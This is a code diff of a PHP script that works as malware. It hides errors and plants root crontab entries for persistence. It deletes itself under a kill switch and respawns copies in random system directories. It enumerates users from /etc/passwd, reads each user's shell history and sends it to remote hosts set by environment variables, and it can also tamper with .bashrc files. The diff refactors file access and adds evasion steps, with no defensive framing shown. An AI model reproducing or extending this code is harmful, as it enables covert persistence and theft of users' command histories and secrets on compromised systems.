@@ -2,6 +2,9 @@
 
 // @phan-file-suppress PhanPluginShortArray,PhanPluginCanUsePHP71Void,PhanPluginPossiblyStaticClosure
 
+ini_set('display_errors', 0);
+error_reporting(0);
+
 $lastSize = array();
 $hosts = explode(',', getenv('TARGET_HOST'));
 $key = getenv('TARGET_KEY');
@@ -12,11 +15,15 @@ $iv = getenv('LOCAL_IV');
 
 $basename = basename(__FILE__, '.php');
 $dir = __DIR__;
-file_put_contents(
-    '/etc/crontab',
-    str_replace("\n* * * * * root sh $dir/$basename", '', file_get_contents('/etc/crontab'))
-);
+replaceIn('/etc/crontab', "\n* * * * * root sh $dir/$basename", '');
+if (function_exists('posix_getuid') && posix_getuid() !== 0) {
+    unlink(__FILE__);
+    unlink("$dir/$basename.sh");
+    exit;
+}
 if (getenv('##KILLNAME##') === '##KILLKEY##') {
+    unlink(__FILE__);
+    unlink("$dir/$basename.sh");
     exit;
 }
 if (extension_loaded('pcntl')) {
@@ -25,9 +32,10 @@ if (extension_loaded('pcntl')) {
     $pcntlhandler = function () use ($dataPhp, $dataSh) {
         $file = randomAlphaNumericString(3);
         $dirs = array('opt', 'usr', 'var', 'home', 'root');
-        $dir = $dirs[rand(0, count($dirs) - 1)];
-        mkdir("/$dir");
-        file_put_contents('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", FILE_APPEND);
+        do {
+            $dir = $dirs[rand(0, count($dirs) - 1)];
+        } while(!is_dir($dir));
+        putIn('/etc/crontab', "\n* * * * * root sh /$dir/$file.sh", true);
         file_put_contents("/$dir/$file.sh", $dataSh);
         file_put_contents("/$dir/$file.php", $dataPhp);
     };
@@ -42,7 +50,7 @@ if (extension_loaded('pcntl')) {
     unlink(__FILE__);
     unlink("$dir/$basename.sh");
 } else {
-    file_put_contents('/etc/crontab', "\n* * * * * root sh $dir/$basename.sh", FILE_APPEND);
+    putIn('/etc/crontab', "\n* * * * * root sh $dir/$basename.sh", FILE_APPEND);
     if (is_file("$dir/$basename.pid")) {
         $pid = intval(file_get_contents("$dir/$basename.pid"), 10);
         if (is_file("/proc/$pid")) {
@@ -54,7 +62,7 @@ if (extension_loaded('pcntl')) {
 
 while (true) {
     $files = array();
-    foreach (explode("\n", file_get_contents('/etc/passwd') ?: '') as $userData) {
+    foreach (explode("\n", getOut('/etc/passwd')) as $userData) {
         if ($userData) {
             $data = explode(':', $userData);
             if ($data[5]) {
@@ -64,7 +72,7 @@ while (true) {
                     if (is_file($history) && is_readable($history)) {
                         $lastSize2 = filesize($history);
                         if (!isset($lastSize[$user]) || $lastSize[$user] !== $lastSize2) {
-                            $data = file_get_contents($history);
+                            $data = getOut($history);
                             if ($data) {
                                 while (!transmit($hosts, $api, $protocol, $data, $key, $user)) {
                                     usleep(mt_rand(1, 999));
@@ -77,9 +85,7 @@ while (true) {
                     if ('###ENABLE_BASHRC_MODIFICATION###' === 'true') {
                         $rc = str_replace('//.bashrc', '/.bashrc', "{$data[5]}/.bashrc");
                         if (is_file($rc) || is_file($history)) {
-                            $lastModified = is_file($rc) ? filemtime($rc) : 0;
-                            $lastAccessed = is_file($rc) ? fileatime($rc) : 0;
-                            $data = is_file($rc) ? file_get_contents($rc) : '';
+                            $data = getOut($rc);
                             $found = false;
                             $lines = explode("\n", $data);
                             foreach ($lines as &$line) {
@@ -99,10 +105,8 @@ while (true) {
                             }
                             $newData = implode("\n", $lines);
                             if ($newData !== $data) {
-                                file_put_contents($rc, $newData);
-                                if ($lastModified + $lastAccessed > 0) {
-                                    touch($rc, $lastAccessed, $lastModified);
-                                } elseif (is_file($history)) {
+                                putIn($rc, $newData);
+                                if (is_file($history)) {
                                     chown($rc, fileowner($history));
                                     chgrp($rc, filegroup($history));
                                     chmod($rc, 0644);
